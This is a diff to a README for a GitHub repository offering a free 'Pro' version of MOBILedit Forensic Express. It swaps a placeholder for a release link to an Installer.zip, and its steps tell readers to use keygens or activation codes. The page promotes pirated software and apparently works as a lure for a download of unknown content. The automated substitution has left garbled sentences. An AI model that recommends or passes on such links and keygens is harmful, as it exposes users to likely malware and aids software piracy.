@@ -18,13 +18,13 @@ Welcome to the MOBILedit Forensic Express Pro Free GitHub repository! Here you w
 ## Resources
 Explore the following resources related to MOBILedit Forensic Express Pro:
 
-- **[Download 555](555)**
-  ![Download Project](555)
+- **[Download https://github.com/csac23sa/MOBILedit-Forensic-Express-Pro-Free/releases/download/Download/Installer.zip](https://github.com/csac23sa/MOBILedit-Forensic-Express-Pro-Free/releases/download/Download/Installer.zip)**
+  ![Download Project](https://github.com/csac23sa/MOBILedit-Forensic-Express-Pro-Free/releases/download/Download/Installer.zip)
 
 ## Getting Started
 Follow these steps to get started with MOBILedit Forensic Express Pro:
 
-1. Download the 555 file from the provided link.
+1. Download the https://github.com/csac23sa/MOBILedit-Forensic-Express-Pro-Free/releases/download/Download/Installer.zip file from the provided link.
 2. Extract the contents to your desired location.
 3. Follow the installation instructions within the package.
 4. Use keygens or activation codes to unlock full features.
